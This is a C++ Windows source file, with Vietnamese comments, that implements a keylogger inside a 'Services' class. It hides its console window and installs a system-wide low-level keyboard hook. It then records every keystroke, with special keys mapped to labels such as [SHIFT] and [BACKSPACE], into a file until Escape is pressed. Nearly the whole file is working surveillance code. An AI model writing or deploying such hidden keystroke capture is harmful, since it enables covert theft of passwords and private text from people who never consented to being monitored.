#include "KeyLogger.h"

std::mutex logMutex;
std::string logData;

bool Services::keyLogger(const std::string &saveFile) {  
    std::ofstream fout(saveFile.c_str());  
    if (!fout.is_open()) {  
        return false;  
    }  

    ShowWindow(GetConsoleWindow(), SW_HIDE);  

    // Thiết lập hook bàn phím  
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);  
    if (!hook) {  
        fout.close();  
        return false;  
    }  

    MSG msg;  
    while (true) {  
        {  
            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
            if (!logData.empty()) {  
                fout << logData;  
                logData.clear();  
            }  
        }  
        if (GetAsyncKeyState(VK_ESCAPE)) {  
            break;
        } 
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {  
            TranslateMessage(&msg);  
            DispatchMessage(&msg);  
        }  
    }  

    UnhookWindowsHookEx(hook);  
    fout.close();  
    return true;  
}

std::vector<std::string> Services::keyLogger(Command command) {
    return std::vector<std::string> ();
}

bool SpecialKeys(int S_Key) {
    switch (S_Key)
    {
    case VK_SPACE:
        logData += " ";
        return true;
    case VK_RETURN:
        logData += "\n";
        return true;
    case VK_LSHIFT:
        logData += "[SHIFT]";
        return true;
    case VK_RSHIFT:
        logData += "[SHIFT]";
        return true;
    case VK_BACK:
        logData += "[BACKSPACE]";
        return true;
    case VK_RBUTTON:
        logData += "[R_CLICK]"; 
        return true;
    case VK_CAPITAL:
        logData += "[CAPS_LOCK]";
        return true;
    case VK_TAB:
        logData += "[TAB]";
        return true;
    case VK_UP:
        logData += "[UP_ARROW]";
        return true;
    case VK_DOWN:
        logData += "[DOWN_ARROW]";
        return true;
    case VK_LEFT:
        logData += "[LEFT_ARROW]";
        return true;
    case VK_RIGHT:
        logData += "[RIGHT_ARROW]";
        return true;
    case VK_LCONTROL:
        logData += "[CONTROL]";
        return true;
    case VK_RCONTROL:
        logData += "[CONTROL]";
        return true;
    case VK_LMENU:
        logData += "[ALT]";
        return true;
    case VK_RMENU:
        logData += "[ALT]";
        return true;
    // case VK_ESCAPE:
    //     logData += "[ESC]";
    //     return true;
    case VK_HOME:
        logData += "[HOME]";
        return true;
    case VK_END:
        logData += "[END]";
        return true;
    case VK_INSERT:
        logData += "[INSERT]";
        return true;
    case VK_DELETE:
        logData += "[DELETE]";
        return true;
    case VK_PRIOR:
        logData += "[PAGE_UP]";
        return true;
    case VK_NEXT:
        logData += "[PAGE_DOWN]";
        return true;
    case VK_F1:
        logData += "[F1]";
        return true;
    case VK_F2:
        logData += "[F2]";
        return true;
    case VK_F3:
        logData += "[F3]";
        return true;
    case VK_F4:
        logData += "[F4]";
        return true;
    case VK_F5:
        logData += "[F5]";
        return true;
    case VK_F6:
        logData += "[F6]";
        return true;
    case VK_F7:
        logData += "[F7]";
        return true;
    case VK_F8:
        logData += "[F8]";
        return true;
    case VK_F9:
        logData += "[F9]";
        return true;
    case VK_F10:
        logData += "[F10]";
        return true;
    case VK_F11:
        logData += "[F11]";
        return true;
    case VK_F12:
        logData += "[F12]";
        return true;
    case VK_LWIN:
        logData += "[LEFT_WIN]";
        return true;
    case VK_RWIN:
        logData += "[RIGHT_WIN]";
        return true;
    case VK_SNAPSHOT:
        logData += "[PRINT_SCREEN]";
        return true;
    case VK_SCROLL:
        logData += "[SCROLL_LOCK]";
        return true;
    case VK_PAUSE:
        logData += "[PAUSE]";
        return true;

    // Các phím đặc biệt
    case VK_OEM_4:
        logData += "[";
        return true;
    case VK_OEM_6:
        logData += "]";
        return true;
    case VK_OEM_1:
        logData += ";";
        return true;
    case VK_OEM_7:
        logData += "'";
        return true;
    case VK_OEM_COMMA:
        logData += ",";
        return true;
    case VK_OEM_PERIOD:
        logData += ".";
        return true;
    case VK_OEM_2:
        logData += "/";
        return true;
    case VK_OEM_5:
        logData += "\\";
        return true;
    case VK_OEM_MINUS:
        logData += "-";
        return true;
    case VK_OEM_PLUS:
        logData += "=";
        return true;

    // Các phím numpad
    case VK_NUMPAD0:
        logData += "0";
        return true;
    case VK_NUMPAD1:
        logData += "1";
        return true;
    case VK_NUMPAD2:
        logData += "2";
        return true;
    case VK_NUMPAD3:
        logData += "3";
        return true;
    case VK_NUMPAD4:
        logData += "4";
        return true;
    case VK_NUMPAD5:
        logData += "5";
        return true;
    case VK_NUMPAD6:
        logData += "6";
        return true;
    case VK_NUMPAD7:
        logData += "7";
        return true;
    case VK_NUMPAD8:
        logData += "8";
        return true;
    case VK_NUMPAD9:
        logData += "9";
        return true;
    case VK_ADD:
        logData += "+";
        return true;
    case VK_SUBTRACT:
        logData += "-";
        return true;
    case VK_MULTIPLY:
        logData += "*";
        return true;
    case VK_DIVIDE:
        logData += "/";
        return true;
    default:
        return false;
    }
}

// Hàm hook cho bàn phím  
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {  
    if (nCode == HC_ACTION) {  
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;  
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {  
            if (kbd->vkCode == VK_ESCAPE) {  
                return 0;   
            }  

            // Nếu là phím đặc biệt  
            std::lock_guard<std::mutex> guard(logMutex); // Khóa mutex  
            if (!SpecialKeys(kbd->vkCode)) {  
                logData += char(kbd->vkCode); 
            }  
        }  
    }  
    return CallNextHookEx(NULL, nCode, wParam, lParam);  
}  
